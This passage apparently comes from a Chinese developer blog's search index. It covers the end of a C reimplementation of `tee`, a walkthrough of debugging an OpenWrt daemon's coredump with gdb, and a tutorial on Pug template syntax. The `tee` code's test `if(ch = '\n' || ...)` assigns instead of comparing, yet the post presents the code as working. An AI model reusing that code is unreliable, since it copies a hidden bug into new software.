buffer[i++] = ch;        if(ch = &#39;\n&#39; || i == BUF_SIZE)&#123;            write(STDOUT_FILENO, buffer, i); // output to stdout            if(fd &gt; 0) write(fd, buffer, i);            memset(buffer, 0, sizeof(buffer));            i = 0;        &#125;    &#125;&#125;</code></pre><p><code>STDIN_FILENO</code>, <code>STDOUT_FILENO</code>分别对应标准输入和标准输出的文件描述符<code>0</code>, <code>1</code>。这两个加上标准错误输出<code>STDERR_FILENO</code>是所有应用程序默认打开的，所以无需手动<code>open</code>。</p><p>此外，输出函数<code>output</code>会判断传入的文件描述符是否有效，如果无效则不会写入文件，仅将数据输出至标准输出。</p><h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><pre><code class="c">#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;stdlib.h&gt;#include &lt;fcntl.h&gt;#include &lt;string.h&gt;#include &lt;getopt.h&gt;#define BUF_SIZE 512#define VERSION &quot;litreily 1.0.0&quot;void output(int fd)&#123;    int i = 0;    char buffer[BUF_SIZE] = &#123;0&#125;;    char ch;    fflush(stdin);    fflush(stdout);    while(read(STDIN_FILENO, &amp;ch, 1) &gt; 0)&#123;        buffer[i++] = ch;        if(ch = &#39;\n&#39; || i == BUF_SIZE)&#123;            write(STDOUT_FILENO, buffer, i); // output to stdout            if(fd &gt; 0) write(fd, buffer, i);            memset(buffer, 0, sizeof(buffer));            i = 0;        &#125;    &#125;&#125;void usage()&#123;    printf(&quot;Usage: tee [OPTION]... [FILE]\n&quot;        &quot;Copy standard input to each FILE, and also to standard output.\n\n&quot;        &quot;  -a, --append   append to the given FILEs, do not overwrite\n&quot;        &quot;  -v, --version  output version information and exit\n&quot;        &quot;      --help     display this help and exit\n&quot;    );    exit(EXIT_FAILURE);&#125;int main(int argc, char *argv[])&#123;    int opt, fd = -1;    int flag_append = 0;    int flags = O_WRONLY | O_CREAT;    struct option opts[] = &#123;        &#123;&quot;append&quot;, 0, NULL, &#39;a&#39;&#125;,        &#123;&quot;help&quot;, 0, NULL, &#39;h&#39;&#125;,        &#123;&quot;version&quot;, 0, NULL, &#39;v&#39;&#125;    &#125;;    while((opt = getopt_long(argc, argv, &quot;:av&quot;,opts, NULL))!=-1) &#123;        switch(opt)&#123;            case &#39;a&#39;:                flag_append = 1;                break;            case &#39;h&#39;:                usage();                break;            case &#39;v&#39;:                printf(VERSION&quot;\n&quot;);                exit(EXIT_FAILURE);                break;            case &#39;?&#39;:                printf(&quot;tee: invaild option -- &#39;%c&#39;\n&quot;                    &quot;Try &#39;tee --help&#39; for more infomation.\n&quot;, optopt);            default:                exit(EXIT_FAILURE);                break;        &#125;    &#125;    if(optind &lt; argc)&#123;        flags += flag_append ? O_APPEND:O_TRUNC;        fd = open(argv[optind], flags, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP | S_IROTH | S_IWOTH);        if(fd == -1)&#123;            printf(&quot;invaild file -- \&quot;%s\&quot;\n&quot;, argv[optind]);            exit(EXIT_FAILURE);        &#125;    &#125;    output(fd);    if(fd &gt; 0)        close(fd);    return 0;&#125;</code></pre><h2 id="指令测试"><a href="#指令测试" class="headerlink" title="指令测试"></a>指令测试</h2><p>使用<code>gcc</code>完成编译，得到<code>tee</code>可执行文件</p><pre><code class="sh">gcc tee.c -o tee</code></pre><p>下面对指令进行测试：</p><pre><code class="sh">$ ./tee --helpUsage: tee [OPTION]... [FILE]Copy standard input to each FILE, and also to standard output.  -a, --append   append to the given FILEs, do not overwrite  -v, --version  output version information and exit      --help     display this help and exit$ ./tee --versionlitreily 1.0.0$ ./tee -htee: invaild option -- &#39;h&#39;Try &#39;tee --help&#39; for more infomation.$ ./tee -vlitreily 1.0.0$ ./tee -a -dtee: invaild option -- &#39;d&#39;Try &#39;tee --help&#39; for more infomation.$ ./tee test.txt112222$ cat test.txt122$ ./tee -a test.txt444444445555555555$ cat test.txt122444455555$ ls | ./tee test.txtmain.cMakefileREADME.mdteetee.ctest.txt$ cat test.txtmain.cMakefileREADME.mdteetee.ctest.txt</code></pre><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol><li><a href="http://man.linuxde.net/tee">tee命令</a></li><li><a href="http://blog.zhangjikai.com/2016/03/05/%E3%80%90C%E3%80%91%E8%A7%A3%E6%9E%90%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0--getopt%E5%92%8Cgetopt_long/">解析命令行参数--getopt和getopt_long</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OpenWrt中使用gdb分析coredump</title>
      <link href="2018/09/20/coredump/"/>
      <url>2018/09/20/coredump/</url>
      
        <content type="html"><![CDATA[<p>近日调试一个<code>bug</code>，一个守护进程在特定情况下执行一段程序后便会挂掉。为了分析<code>bug</code>产生原因，本人使用了printf, strace追踪，gdb调试等诸多调试工具和测试方法。本文对于在<code>OpenWrt</code>嵌入式系统中启用<code>gdb</code>功能及其使用方法进行详细说明。</p><h2 id="调试背景"><a href="#调试背景" class="headerlink" title="调试背景"></a>调试背景</h2><p>我最先通过<code>strace</code>工具追踪发现进程是在收到<code>SIGABRT</code>信号后被<code>kill</code>的。</p><pre><code class="c">pipe([8, 9])                            = 0fcntl64(8, F_GETFL)                     = 0 (flags O_RDONLY)ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbe90a454) = -1 EINVAL (Invalid argument)rt_sigprocmask(SIG_UNBLOCK, [ABRT], NULL, 8) = 0tgkill(14189, 14189, SIGABRT)             = 0--- SIGABRT (Aborted) @ 0 (0) ---Process 14189 detached</code></pre><p>由以上信息可知，进程在执行某个管道<code>pipe</code>相关操作时被<code>kill</code>，通常是在执行<code>popen</code>函数会出现<code>pipe</code>调用。之后对源码<code>grep -rn popen</code>， 并结合<code>strace</code>打印的出错前的信息可以大致定位到可能出错的位置，然后通过添加<code>printf</code>打印<code>log</code>，根据重现时停止打印<code>log</code>的地方精确定位到源码出错位置。</p><pre><code class="C">// config.cchar * config_get(char *name) &#123;    FILE *fp;    char cmd[128]=&#123;0&#125;;    snprintf(cmd, sizeof(cmd)-1, &quot;config get %s&quot;, name);    fp = popen(cmd, &quot;r&quot;);   // 出错位置    // ...&#125;</code></pre><p>至此，仅仅能判断出用户态的出错位置，但从此处代码尚无法明确出错的根本原因，还需抓取内核态的出错信息，此时便需要使用<code>GDB</code>对进程出错时系统生成的<code>coredump</code>文件进行分析了。</p><h2 id="编译gdb以及带symbols的程序"><a href="#编译gdb以及带symbols的程序" class="headerlink" title="编译gdb以及带symbols的程序"></a>编译gdb以及带symbols的程序</h2><p>在分析之前，需要被调试进程的二进制文件包含<code>GDB</code>分析所需的<code>symbols</code>，什么是<code>symbols</code>? 粗略的讲，就是一张嵌入待调试进程的二进制文件中的映射表，包含代码中的变量、函数名、行号等信息。详见<a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm">GDB-Debugging Symbols</a></p><h3 id="配置编译参数"><a href="#配置编译参数" class="headerlink" title="配置编译参数"></a>配置编译参数</h3><p><code>OpenWrt</code>编译参数存于<code>.config</code>文件中，<code>OpenWrt</code>默认并未打开<code>gdb</code>功能以及<code>debug</code>调试功能，我们可以通过<code>make menuconfig</code>选择参数或者手动更改配置文件。</p><pre><code class="sh"># .configCONFIG_DEBUG=y # 使能调试功能，启用后会给集成GDB调试所需的symbolsCONFIG_NO_STRIP=y # 禁用strip，防止程序代码被打乱#CONFIG_USE_SSTRIP=yCONFIG_TOOLCHAINOPTS=y # 使能交叉工具链可选功能，这是编译GDB功能的总开关</code></pre><p>配置完成后重新编译交叉工具链，用以得到<code>gdb</code>工具</p><pre><code class="sh">make toolchain/&#123;compile,install&#125; V=s</code></pre><h3 id="编译单个模块-package"><a href="#编译单个模块-package" class="headerlink" title="编译单个模块(package)"></a>编译单个模块(package)</h3><p>参考<code>OpenWrt</code>官方<a href="https://wiki.openwrt.org/doc/devel/gdb?s%5B%5D=gdb">文档</a>，可以使用以下指令单独为一个模块添加<code>debug symbols</code></p><pre><code class="sh">make package/traffic_meter/&#123;clean,compile,install&#125; V=99 CONFIG_DEBUG=y</code></pre><h3 id="完整编译"><a href="#完整编译" class="headerlink" title="完整编译"></a>完整编译</h3><p>如果将全局<code>debug</code>开启，并进行完整编译，这会导致<code>image</code>过大（&gt;300M）而编译失败。当然啦，编译失败不要紧，因为只是没有生成<code>image</code>文件，但是所需模块和动态链接库都能正常编译完成，并不影响<code>coredump</code>文件的分析。</p><p>不过完整编译太过费时，不推荐，还是对需要调试的单个模块进行编译比较快捷和方便。</p><h2 id="获取coredump"><a href="#获取coredump" class="headerlink" title="获取coredump"></a>获取coredump</h2><p>得到了带有<code>symbols</code>的二进制文件，以及交叉编译得到的<code>gdb</code>调试工具，剩下的就是获取<code>coredump</code>文件</p><h3 id="配置coredump参数"><a href="#配置coredump参数" class="headerlink" title="配置coredump参数"></a>配置coredump参数</h3><pre><code class="sh">$ sudo vi /etc/profile# 在文件末尾添加以下指令，以取消对coredump文件大小的限制ulimit -c unlimited$ source /etc/profile# 设置coredump文件命名格式# e - process name; p - pid; t - time$ echo &quot;core-%e-%p-%t&quot; &gt; /proc/sys/kernel/core_pattern</code></pre><p>关于<code>coredump</code>文件格式的参数说明，可以参考<a href="http://man7.org/linux/man-pages/man5/core.5.html">core dump file</a></p><h3 id="重现bug并获取coredump文件"><a href="#重现bug并获取coredump文件" class="headerlink" title="重现bug并获取coredump文件"></a>重现bug并获取coredump文件</h3><p>首先重现bug，然后找到<code>coredump</code>文件，并传至编译服务器</p><pre><code class="sh">$ cd /$ find . -name &quot;core-*&quot; |grep traffic_meter./sbin/core-traffic_meter-14189-2895$ cd sbin$ tftp -pl core-traffic_meter-14189-2895 192.168.1.10</code></pre><h2 id="GDB调试"><a href="#GDB调试" class="headerlink" title="GDB调试"></a>GDB调试</h2><h3 id="常用指令"><a href="#常用指令" class="headerlink" title="常用指令"></a>常用指令</h3><p>下面是常用的几个<code>gdb</code>指令</p><pre><code class="sh">(gdb) help(gdb) where(gdb) bt    # backtrace(gdb) list  # [l] 显示当前调试处的相关代码(gdb) up [num]  # 向上跳转1个或num个bt(gdb) down [num]    # 向下跳转1个或num个bt(gdb) print [variable]  # [p] 打印当前调试处相关变量的值</code></pre><h3 id="调试实例"><a href="#调试实例" class="headerlink" title="调试实例"></a>调试实例</h3><pre><code class="sh">$ cd repo.git$ cd build_dir/target-arm_v7=a_uClibc-0.9.33.2_eabi/root-ipq806x$ ../../toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb sbin/traffic_meter ~/core-traffic_meter-14189-28959-2895GNU gdb (Linaro GDB) 7.2-2011.03-0Copyright (C) 2010 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;--host=x86_64-linux-gnu --target=arm-openwrt-linux-uclibcgnueabi&quot;.For bug reporting instructions, please see:&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/sbin/traffic_meter...done.warning: exec file is newer than core file.[New Thread 14189]Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1...done.Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libgcc_s.so.1Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0...done.Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/libc.so.0Reading symbols from /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0...done.Loaded symbols for /home/litreily/R7500v2-Fortify.git/build_dir/target-arm_v7-a_uClibc-0.9.33.2_eabi/root-ipq806x/lib/ld-uClibc.so.0Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.Program terminated with signal 6, Aborted.#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:6767        int res = INLINE_SYSCALL (tgkill, 3, pid, selftid, sig);(gdb) bt#0  0x402fb4fc in raise (sig=6) at libpthread/nptl/sysdeps/unix/sysv/linux/raise.c:67#1  0x402f579c in abort () at libc/stdlib/abort.c:89#2  0x402f5060 in __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:234#3  __malloc_consolidate (av=0x4030b3e8) at libc/stdlib/malloc-standard/free.c:170#4  0x402f4854 in malloc (bytes=&lt;value optimized out&gt;) at libc/stdlib/malloc-standard/malloc.c:908#5  0x402d6250 in _stdio_fopen (fname_or_mode=&lt;value optimized out&gt;, mode=&lt;value optimized out&gt;, stream=0x8ca0e8, filedes=8) at libc/stdio/_fopen.c:177#6  0x402d4fb4 in popen (command=0x8 &lt;Address 0x8 out of bounds&gt;, modes=0xfc08 &quot;r&quot;) at libc/stdio/popen.c:83#7  0x0000f488 in config_get (name=&lt;value optimized out&gt;) at config.c:11#8  0x0000ed48 in get_bogus_time_region (ct=60744, st=0xbe9f8994, btr=0xbe9f896c) at util.c:184#9  0x0000e8f0 in get_traffic_from_flash (tfm=0xbe9f8738, ct=2894) at spi_flash.c:912#10 0x0000ccb0 in restart_traffic_counter (tfm=0xbe9f8738, ct=52400) at trafficmeter.c:976#11 0x0000a1f4 in main (argc=&lt;value optimized out&gt;, argv=&lt;value optimized out&gt;) at trafficmeter.c:1798(gdb)</code></pre><blockquote><p><strong>BackTrace (bt) 输出</strong><br>#num memory_addr in function (arg1=val1, arg2=val2,...) at file.c:line<br><code>bt</code>输出前面的编号是进程执行时的压栈顺序，编号越小越底层。编号后面紧跟的是内存地址，从地址大小可以看出哪些是内核调用，哪些是用户调用。  </p><p><strong>注意：</strong>由于编译器优化缘故，某些变量会显示<code>value optimized out</code>，如果想获取真实值，需要在编译时添加<code>-O0</code>，用以禁用编译器优化</p></blockquote><p>从<code>bt</code>结果可以看出，进程是在执行动态内存分配函数<code>malloc</code>时检测到错误，并执行<code>abort</code>函数触发<code>SIGABRT</code>信号后退出的。那就可以确定是内存问题，多半是内存多次释放或是未释放导致的。</p><p>据此线索，检查代码中与内存分配和释放相关的部分，最终调试发现是某处代码引用指针错误，并在之后使用<code>free</code>释放内存，而该指针指向的内存在多处地方被重新分配和释放，导致内存出现不可预料的问题。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><p>在分析<code>coredump</code>时，需要注意以下几点：</p><ol><li>交叉编译后的<code>GDB</code>可执行文件位于<code>build_dir/toolchain-arm_v7-a_gcc-4.6-linaro_uClibc-0.9.33.2_eabi/gdb-linaro-7.2-2011.03-0/gdb/gdb</code></li><li>注意当前调试路径最好是在编译完成后的根目录<code>root-ipq806x</code>, 否则<code>GDB</code>可能无法找到动态链接库的位置，从而无法找到库函数的<code>symbols</code>，此时可能出现以下情况</li></ol><pre><code class="sh">warning: exec file is newer than core file.[New Thread 14189]warning: Could not load shared library symbols for 3 libraries, e.g. /lib/libgcc_s.so.1.Use the &quot;info sharedlibrary&quot; command to see the complete listing.Do you need &quot;set solib-search-path&quot; or &quot;set sysroot&quot;?warning: Unable to find dynamic linker breakpoint function.GDB will be unable to debug shared library initializersand track explicitly loaded dynamic code.Core was generated by `traffic_meter -w brwan -p ppp0 -m /dev/mtd15`.Program terminated with signal 6, Aborted.#0  0x402fb4fc in ?? ()Setting up the environment for debugging gdb.Function &quot;internal_error&quot; not defined.Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal]Function &quot;info_command&quot; not defined.Make breakpoint pending on future shared library load? (y or [n]) [answered N; input not from terminal].gdbinit:8: Error in sourced command file:Argument required (one or more breakpoint numbers).(gdb) info sharedlibraryFrom        To          Syms Read   Shared Object Library                        No          /lib/libgcc_s.so.1                        No          /lib/libc.so.0                        No          /lib/ld-uClibc.so.0(gdb) bt#0  0x402fb4fc in ?? ()#1  0x402f579c in ?? ()#2  0x402f579c in ?? ()Backtrace stopped: previous frame identical to this frame (corrupt stack?)</code></pre><p>若出现以上情况，我们得不到任何有效信息，此时可以通过提示的<code>set solib-search-path</code>或<code>set sysroot</code>手动设置库路径或根目录路径。但我仍建议在调试前<code>cd</code>到根目录。</p><h2 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h2><ol><li><a href="https://blog.51cto.com/terrytong914/1905041">Linux coredump解决流程</a></li><li><a href="https://wiki.openwrt.org/doc/devel/gdb?s%5B%5D=gdb">GNU Debugger</a></li><li><a href="https://www.tutorialspoint.com/gnu_debugger/gdb_debugging_symbols.htm">GDB - Debugging Symbols</a></li><li><a href="http://man7.org/linux/man-pages/man5/core.5.html">Core dump file</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> Embedded </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> openwrt </tag>
            
            <tag> gdb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网页模板pug基本语法</title>
      <link href="2018/08/31/pug-synax/"/>
      <url>2018/08/31/pug-synax/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Pug – robust, elegant, feature rich template engine for Node.js</p></blockquote><p><code>pug</code>原名<code>jade</code>,因版权问题更名为<code>pug</code>,即哈巴狗。与<code>hexo</code>默认模块<code>ejs</code>一样，<code>pug</code>也是一个模板引擎，可用于快速的网站开发，当然也可以用于静态博客网站的设计。本站点现时所用主题<code>manupassant</code>也使用了<code>pug</code>。</p><span id="more"></span><p>本文针对<code>Hexo</code>中使用<code>pug</code>的情况为例，说明其基本语法。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><pre><code class="sh"># common installnpm install pug# install for hexo blognpm install hexo-renderer-pug --save</code></pre><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><p><code>pug</code>不同于<code>html</code>，前者不需要标签的开和闭，如<code>html</code>的<code>&lt;p&gt;Demo&lt;/p&gt;</code>，在<code>pug</code>使用<code>p Demo</code>即可。</p><h3 id="缩进"><a href="#缩进" class="headerlink" title="缩进"></a>缩进</h3><p><code>pug</code>对空格敏感，有点类似<code>python</code>对制表符<code>tab</code>敏感。<code>pug</code>使用空格作为缩进符，当然用soft tab也可行。同一级标签需保证左对齐。</p><pre><code class="pug">div    p Hello, world!    p Hello, pug.</code></pre><p>渲染结果如下：</p><pre><code class="html">&lt;div&gt;    &lt;p&gt;Hellow, world!&lt;/p&gt;    &lt;p&gt;Hello, pug.&lt;/p&gt;&lt;/div&gt;</code></pre><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p><code>pug</code>使用<code>//-</code>或<code>//</code>对代码进行注释，前者注释内容不出现在渲染后的<code>html</code>文件中，后者反之。</p><pre><code class="pug">//- html中不包含此行// html中会包含此行</code></pre><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><p><code>pug</code>将标签属性存放于括号<code>()</code>内，多个属性之间以逗号或空格分隔。此外，对于标签的<code>id</code>和<code>class</code>，<code>pug</code>使用<code>#</code>紧跟标签<code>id</code>,使用<code>.</code>紧跟标签<code>class</code>，可以同时设置多个<code>class</code>。</p><pre><code class="pug">h1#title Test titleimg#name.class1.class2(src=&quot;/test.png&quot; alt=&quot;test&quot;)</code></pre><p>↓</p><pre><code class="html">&lt;h1 id=&quot;title&quot;&gt;Test title&lt;/h1&gt;&lt;img id=&quot;name&quot; class=&quot;class1 class2&quot; src=&quot;/test.png&quot; alt=&quot;test&quot;&gt;</code></pre><h3 id="包含"><a href="#包含" class="headerlink" title="包含"></a>包含</h3><p>为了方便代码复用，<code>pug</code>提供了<code>include</code>包含功能，以下代码会将<code>_partial</code>目录下的<code>head.pug</code>文件内容包含到当前调用的位置。有点<code>C/C++</code>中内联函数的意思。</p><pre><code class="pug">doctype htmlhtml(lang=&#39;en&#39;)    include _partial/head.pug</code></pre><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><p>下面是一个简单的<code>base</code>模板，通过<code>block</code>定义了页面头部<code>head</code>和内容<code>body</code>。块<code>block</code>有点类似<code>C/C++</code>的抽象函数，需要在继承者中完成定义，填充具体内容。</p><pre><code class="pug">//- base.pughtml    head        block title    body        block content</code></pre><p>以下文件使用<code>extends</code>继承以上模板，通过<code>block</code>覆盖或替换原有块<code>block</code>。当然，继承者也可以在原有基础上继续扩展。</p><pre><code class="pug">//- index.pugextends base.pugblock title    title &quot;Test title&quot;block content    h1 Hello world!    block article</code></pre><h3 id="定义变量"><a href="#定义变量" class="headerlink" title="定义变量"></a>定义变量</h3><p><code>pug</code>中通过<code>- var name = value</code>的形式定义变量</p><pre><code class="pug">- var intData = 100- var boolData = false- var stringData = &#39;Test&#39;p.int= intDatap.bool= boolDatap.stringData= stringData</code></pre><blockquote><p>需注意的是，在引用变量时，需要在引用位置加上<code>=</code>号，否则会默认将变量名当成普通字符串使用。</p></blockquote><p>如果想要将变量与其它字符串常量或是变量连接在一起，就不能用等号了，而是应该用<code>#&#123;&#125;</code>，该符号会对大括号内的变量进行求值和转义，最终得到渲染输出的内容。</p><pre><code class="pug">- var girl = &#39;Lily&#39;- var boy = &#39;Jack&#39;p #&#123;girl&#125; is so beautiful!p And #&#123;boy&#125; is handsome.</code></pre><h3 id="条件结构"><a href="#条件结构" class="headerlink" title="条件结构"></a>条件结构</h3><p><code>pug</code>的条件语句与其它语言类似，均是如下这般：</p><pre><code class="pug">- var A = &#123;value: &#39;Test&#39;&#125;- var B = trueif A.value    p= A.valueelse if B    p= Belse    p nothing</code></pre><h3 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h3><p><code>pug</code>中使用<code>each</code>和<code>while</code>实现循环迭代，<code>each</code>可以返回当前所在项的索引值，默认从0开始计数。</p><pre><code class="pug">//- eachol    each item in [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]        li= item//- get index of each- var week = [&#39;Sun&#39;, &#39;Mon&#39;, &#39;Tus&#39;, &#39;Wen&#39;, &#39;Thu&#39;, &#39;Fri&#39;, &#39;Sat&#39;]ol    each item, index in week        li= index + &#39;:&#39; + item</code></pre><p>↓</p><pre><code class="html">&lt;ol&gt;  &lt;li&gt;Sun&lt;/li&gt;  &lt;li&gt;Mon&lt;/li&gt;  &lt;li&gt;Tus&lt;/li&gt;  &lt;li&gt;Wen&lt;/li&gt;  &lt;li&gt;Thu&lt;/li&gt;  &lt;li&gt;Fri&lt;/li&gt;  &lt;li&gt;Sat&lt;/li&gt;&lt;/ol&gt;&lt;ol&gt;  &lt;li&gt;0:Sun&lt;/li&gt;  &lt;li&gt;1:Mon&lt;/li&gt;  &lt;li&gt;2:Tus&lt;/li&gt;  &lt;li&gt;3:Wen&lt;/li&gt;  &lt;li&gt;4:Thu&lt;/li&gt;  &lt;li&gt;5:Fri&lt;/li&gt;  &lt;li&gt;6:Sat&lt;/li&gt;&lt;/ol&gt;</code></pre><p><code>while</code>调用方式如下：</p><pre><code class="pug">//- while- var day = 1ul    while day &lt; 7        li= day++</code></pre><h3 id="Minix"><a href="#Minix" class="headerlink" title="Minix"></a>Minix</h3><p><code>mixin</code>名曰<strong>混入</strong>，类似其它编程语言中的<strong>函数</strong>，也是为了代码复用，可带参数或不带参数，定义方式如下：</p><pre><code class="pug">mixin menu-item(href, name)    li        span.dot ●        a(href=href)= name</code></pre><p>其中，<code>menu-item</code>为调用时所用名称，可认为是函数名，<code>href</code>及<code>name</code>是参数。同上<a href="#%E5%AE%9A%E4%B9%89%E5%8F%98%E9%87%8F">定义变量</a>所说，<code>a(href=href)= name</code>中第二个<code>=</code>是为了将后面的<code>name</code>当作参数来处理，而不是当作字符串&quot;name&quot;来处理。</p><p>调用<code>mixin</code>定义的代码块，需通过<code>+</code>号紧跟<code>mixin</code>名称及参数:</p><pre><code class="pug">+menu-item(&#39;/Archives&#39;,&#39;Archives&#39;)+menu-item(&#39;/About&#39;,&#39;About&#39;)</code></pre><p><code>mixin</code>之所以称为混入，是因为其语法不局限于函数调用，在<code>mixin</code>可以使用块<code>block</code></p><pre><code class="pug">mixin print(post)    if block        block    else        p= post+print(&quot;no block&quot;)+print(&quot;&quot;)    div.box        p this is the content of block</code></pre><p>↓</p><pre><code class="html">&lt;p&gt;no block&lt;/p&gt;&lt;div class=&quot;box&quot;&gt;&lt;p&gt;this is the content of block&lt;/p&gt;&lt;/div&gt;</code></pre><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><p>注意以下<code>pug</code>语句中第一行的<code>.</code>号。</p><pre><code class="pug">script(type=&#39;text/javascript&#39;).    var data = &quot;Test&quot;    var enable = true    if enable        console.log(data)    else        console.log(&#39;nothing&#39;)</code></pre><p>↓</p><pre><code class="js">&lt;script type=&#39;text/javascript&#39;&gt;    var data = &quot;Test&quot;    var enable = true    if enable        console.log(data)    else        console.log(&#39;nothing&#39;)&lt;/script&gt;</code></pre><p>对于简单脚本，使用<code>pug</code>尚可，复杂的还是单独写到<code>.js</code>文件中，然后通过<code>pug</code>引用方便一些，引用方式如下：</p><pre><code class="pug">script(type=&#39;text/javascript&#39;, src=&#39;/path/to/js&#39;)//- with hexo function url_forscript(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39;)</code></pre><h3 id="hexo-相关"><a href="#hexo-相关" class="headerlink" title="hexo 相关"></a>hexo 相关</h3><p>在<code>hexo</code>主题中使用<code>pug</code>时，可以通过使用<code>hexo</code>提供的全局变量<code>config</code>，<code>theme</code>来分别调用博客根目录下<code>_config.yml</code>文件中的参数以及主题根目录下<code>_config.yml</code>文件中的参数。</p><pre><code class="pug">//- blog configp= config.description//- theme configp= theme.title</code></pre><p>当然，<code>pug</code>中可以直接使用<code>hexo</code>提供的其它全局变量及辅助函数，使用方法详见<code>hexo</code>的<a href="https://hexo.io/zh-cn/docs/variables">文档</a></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><pre><code class="pug">//- head.pughead    meta(http-equiv=&#39;content-type&#39;, content=&#39;text/html; charset=utf-8&#39;)    meta(content=&#39;width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0&#39;, name=&#39;viewport&#39;)    meta(content=&#39;yes&#39;, name=&#39;apple-mobile-web-app-capable&#39;)    meta(content=&#39;black-translucent&#39;, name=&#39;apple-mobile-web-app-status-bar-style&#39;)    meta(content=&#39;telephone=no&#39;, name=&#39;format-detection&#39;)    meta(name=&#39;description&#39;, content=config.description)    block title    link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.css) + &#39;/style.css&#39; + &#39;?v=&#39; + theme.version)    link(rel=&#39;Shortcut Icon&#39;, type=&#39;image/x-icon&#39;, href=url_for(&#39;favicon.png&#39;))    script(type=&#39;text/javascript&#39;, src=&#39;//cdn.bootcss.com/jquery/3.3.1/jquery.min.js&#39;)    block more</code></pre><pre><code class="pug">//- base.pugdoctype htmlhtml(lang=&#39;en&#39;)    include _partial/head.pug    block more        link(rel=&#39;stylesheet&#39;, type=&#39;text/css&#39;, href=url_for(theme.plugins) + &#39;/prettify/doxy.css&#39;)        script(type=&#39;text/javascript&#39;, src=url_for(theme.js) + &#39;/ready.js&#39; + &#39;?v=&#39; + theme.version, async)    //- body    body: #container.box        .h-wrapper            include _partial/nav-menu.pug        // article content        block content        include _partial/footer.pug</code></pre><p>其中:</p><ul><li><code>theme.*</code>为主题配置文件<code>_config.yml</code>中的参数</li><li><code>url_for</code>为<code>hexo</code>提供的用于查找资源路径的函数</li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><code>pug</code>提供了包含，继承，Mixin等多种方式用于代码复用，语法简洁易懂，除了初学时需花费一些时间学习各种标点符号的含义外，其它倒也没有太大困难。</p><p>当然啦，<code>pug</code>还有许多其它特性，但就我目前使用情况而言，以上这些便已足够。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li><a href="https://pugjs.org/zh-cn/api/getting-started.html">https://pugjs.org/zh-cn/api/getting-started.html</a></li><li><a href="https://hexo.io/zh-cn/docs/">https://hexo.io/zh-cn/docs/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pug </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现快排及其可视化</title>
      <link href="2018/07/07/quick-sort/"/>
      <url>2018/07/07/quick-sort/</url>
      
